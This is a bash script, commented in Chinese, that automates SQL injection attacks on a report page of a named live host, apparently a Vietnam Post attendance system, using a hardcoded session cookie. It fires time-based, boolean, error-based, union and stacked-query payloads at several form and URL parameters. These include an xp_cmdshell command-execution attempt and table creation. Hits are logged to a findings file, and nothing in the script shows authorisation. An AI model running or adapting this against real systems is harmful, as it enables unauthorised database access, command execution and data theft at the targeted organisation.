#!/bin/bash

COOKIE="ASP.NET_SessionId=bezu1wgtbs241i4cyhxapaou"
BASE="http://vps.vnpost.vn/chamcong"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 超深度SQL注入挖掘"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[测试1] 精确时间盲注（报表查询）"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

get_viewstate() {
    local id=$1
    page=$(curl -sk "${BASE}/report/inBCC.aspx?ID=${id}" -H "Cookie: $COOKIE" 2>&1)
    VS=$(echo "$page" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3)
    VG=$(echo "$page" | grep -oE '__VIEWSTATEGENERATOR" value="[^"]+' | cut -d'"' -f3)
    EV=$(echo "$page" | grep -oE '__EVENTVALIDATION" value="[^"]+' | cut -d'"' -f3)
}

# 基线时间测试
echo "  [1.1] 建立基线..."
get_viewstate "BC01"

for i in {1..3}; do
    start=$(date +%s%N)
    curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "txtThang=11" \
        --data-urlencode "txtNam=2025" \
        --data-urlencode "btnExport=Export" \
        -o /dev/null 2>&1
    end=$(date +%s%N)
    elapsed=$(( (end - start) / 1000000 ))
    echo "    基线 $i: ${elapsed}ms"
    baseline=$elapsed
done

echo ""
echo "  [1.2] 时间盲注 - txtThang参数"

SQLI_TIME_PAYLOADS=(
    "11'; WAITFOR DELAY '00:00:05'--"
    "11' AND (SELECT 1 FROM (SELECT SLEEP(5))x)--"
    "11' AND SLEEP(5)--"
    "11'; IF (1=1) WAITFOR DELAY '00:00:05'--"
    "11' OR SLEEP(5)--"
)

for payload in "${SQLI_TIME_PAYLOADS[@]}"; do
    echo ""
    echo "    测试: $payload"
    
    get_viewstate "BC01"
    
    start=$(date +%s%N)
    resp=$(curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "txtThang=${payload}" \
        --data-urlencode "txtNam=2025" \
        --data-urlencode "btnExport=Export" \
        -o "time_txtThang_$(echo $payload | md5sum | cut -d' ' -f1).html" 2>&1)
    end=$(date +%s%N)
    
    elapsed=$(( (end - start) / 1000000 ))
    diff=$(( elapsed - baseline ))
    
    echo "      耗时: ${elapsed}ms (差异: ${diff}ms)"
    
    if [ $diff -gt 4000 ]; then
        echo "      🔥🔥🔥🔥🔥 时间盲注成功！延迟了${diff}ms！"
        echo "      发现SQL注入: txtThang参数"
        echo "$payload" > SQLI_FOUND.txt
    fi
done

echo ""
echo "  [1.3] 时间盲注 - txtNam参数"

for payload in "${SQLI_TIME_PAYLOADS[@]}"; do
    echo ""
    echo "    测试: $payload"
    
    get_viewstate "BC01"
    
    start=$(date +%s%N)
    curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "txtThang=11" \
        --data-urlencode "txtNam=${payload}" \
        --data-urlencode "btnExport=Export" \
        -o /dev/null 2>&1
    end=$(date +%s%N)
    
    elapsed=$(( (end - start) / 1000000 ))
    diff=$(( elapsed - baseline ))
    
    echo "      耗时: ${elapsed}ms (差异: ${diff}ms)"
    
    if [ $diff -gt 4000 ]; then
        echo "      🔥🔥🔥🔥🔥 时间盲注成功！"
        echo "txtNam: $payload" >> SQLI_FOUND.txt
    fi
done

echo ""
echo "  [1.4] 时间盲注 - ID参数（URL）"

REPORT_IDS=("BC01" "BC02" "BC03" "MAU2")

for id in "${REPORT_IDS[@]}"; do
    echo ""
    echo "    测试ID: ${id}"
    
    # SQL注入在ID参数
    sqli_ids=(
        "${id}' AND SLEEP(5)--"
        "${id}'; WAITFOR DELAY '00:00:05'--"
    )
    
    for sqli_id in "${sqli_ids[@]}"; do
        echo "      Payload: $sqli_id"
        
        get_viewstate "$sqli_id"
        
        start=$(date +%s%N)
        curl -sk "${BASE}/report/inBCC.aspx?ID=${sqli_id}" \
            -H "Cookie: $COOKIE" \
            -o /dev/null 2>&1
        end=$(date +%s%N)
        
        elapsed=$(( (end - start) / 1000000 ))
        
        echo "        耗时: ${elapsed}ms"
        
        if [ $elapsed -gt 5000 ]; then
            echo "        🔥🔥🔥🔥🔥 ID参数存在时间盲注！"
            echo "ID: $sqli_id" >> SQLI_FOUND.txt
        fi
    done
done

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[测试2] 布尔盲注（基于响应差异）"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo "  获取True基线..."
get_viewstate "BC01"

curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
    -X POST \
    -H "Cookie: $COOKIE" \
    --data-urlencode "__VIEWSTATE=$VS" \
    --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
    --data-urlencode "__EVENTVALIDATION=$EV" \
    --data-urlencode "txtThang=11' AND '1'='1" \
    --data-urlencode "txtNam=2025" \
    --data-urlencode "btnExport=Export" \
    -o bool_true.html 2>&1

true_size=$(wc -c < bool_true.html)
true_hash=$(md5sum bool_true.html | cut -d' ' -f1)

echo "    True响应: $true_size bytes (hash: $true_hash)"

echo ""
echo "  获取False基线..."
get_viewstate "BC01"

curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
    -X POST \
    -H "Cookie: $COOKIE" \
    --data-urlencode "__VIEWSTATE=$VS" \
    --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
    --data-urlencode "__EVENTVALIDATION=$EV" \
    --data-urlencode "txtThang=11' AND '1'='2" \
    --data-urlencode "txtNam=2025" \
    --data-urlencode "btnExport=Export" \
    -o bool_false.html 2>&1

false_size=$(wc -c < bool_false.html)
false_hash=$(md5sum bool_false.html | cut -d' ' -f1)

echo "    False响应: $false_size bytes (hash: $false_hash)"

echo ""
if [ "$true_hash" != "$false_hash" ] || [ $true_size -ne $false_size ]; then
    echo "  🔥🔥🔥🔥🔥 布尔盲注成功！True和False响应不同！"
    echo "    差异: $((true_size - false_size)) bytes"
    echo "Boolean Blind SQLi in txtThang" >> SQLI_FOUND.txt
    
    echo ""
    echo "  响应差异分析:"
    diff bool_true.html bool_false.html | head -20
else
    echo "  ❌ True和False响应相同"
fi

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[测试3] 错误注入（SQL Server特定）"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

ERROR_PAYLOADS=(
    "11' AND 1=CONVERT(int,(SELECT @@version))--"
    "11' AND 1=CAST((SELECT @@version) AS int)--"
    "11' AND 1=(SELECT TOP 1 name FROM sys.databases)--"
    "11' UNION SELECT NULL,@@version,NULL--"
    "11' AND 1=DB_NAME()--"
    "11' AND 1=(SELECT name FROM sys.tables WHERE name='users')--"
)

for payload in "${ERROR_PAYLOADS[@]}"; do
    echo ""
    echo "  测试: $payload"
    
    get_viewstate "BC01"
    
    curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "txtThang=${payload}" \
        --data-urlencode "txtNam=2025" \
        --data-urlencode "btnExport=Export" \
        -o "error_$(echo $payload | md5sum | cut -d' ' -f1).html" 2>&1
    
    result_file="error_$(echo $payload | md5sum | cut -d' ' -f1).html"
    
    # 查找SQL Server错误信息
    if grep -qiE "conversion.*failed|invalid.*column|syntax.*error|microsoft.*sql.*server|unclosed.*quotation" "$result_file"; then
        echo "    🔥🔥🔥🔥🔥 发现SQL错误信息！"
        grep -iE "conversion|invalid|syntax|error" "$result_file" | head -5
        echo "Error-based SQLi: $payload" >> SQLI_FOUND.txt
    fi
    
    # 查找数据泄露
    if grep -qiE "Microsoft SQL Server|version|database.*name|table.*name" "$result_file"; then
        echo "    🔥🔥🔥🔥🔥 数据泄露！"
        grep -iE "Microsoft|version|database|table" "$result_file" | head -10
    fi
done

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[测试4] Union注入（深度测试）"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 先确定列数
echo "  [4.1] 确定列数..."

for cols in {1..20}; do
    payload="11' UNION SELECT $(seq -s',' 1 $cols)--"
    
    get_viewstate "BC01"
    
    resp=$(curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "txtThang=${payload}" \
        --data-urlencode "txtNam=2025" \
        --data-urlencode "btnExport=Export" \
        -o "union_cols_${cols}.html" 2>&1)
    
    # 检查是否没有列数错误
    if ! grep -qiE "number.*of.*column|column.*name.*invalid|all.*queries" "union_cols_${cols}.html"; then
        echo "    可能的列数: $cols"
        
        # 尝试获取数据
        if grep -qE "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|version|database|user|admin" "union_cols_${cols}.html"; then
            echo "    🔥🔥🔥🔥🔥 Union注入成功！列数=$cols"
            echo "Union SQLi with $cols columns" >> SQLI_FOUND.txt
            head -50 "union_cols_${cols}.html"
        fi
    fi
done

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[测试5] 堆叠查询（多语句执行）"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

STACKED_PAYLOADS=(
    "11'; SELECT 1--"
    "11'; WAITFOR DELAY '00:00:05'; SELECT 1--"
    "11'; EXEC xp_cmdshell 'whoami'--"
    "11'; CREATE TABLE test_sqli (id INT)--"
)

for payload in "${STACKED_PAYLOADS[@]}"; do
    echo ""
    echo "  测试: $payload"
    
    get_viewstate "BC01"
    
    start=$(date +%s%N)
    curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "txtThang=${payload}" \
        --data-urlencode "txtNam=2025" \
        --data-urlencode "btnExport=Export" \
        -o "stacked_$(echo $payload | md5sum | cut -d' ' -f1).html" 2>&1
    end=$(date +%s%N)
    
    elapsed=$(( (end - start) / 1000000 ))
    
    if [ $elapsed -gt 5000 ]; then
        echo "    🔥🔥🔥🔥🔥 堆叠查询成功！（延迟了${elapsed}ms）"
        echo "Stacked Queries: $payload" >> SQLI_FOUND.txt
    fi
done

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ 超深度SQL注入测试完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

if [ -f "SQLI_FOUND.txt" ]; then
    echo ""
    echo "🔥🔥🔥🔥🔥 发现SQL注入！"
    echo ""
    cat SQLI_FOUND.txt
else
    echo ""
    echo "❌ 未发现SQL注入"
fi
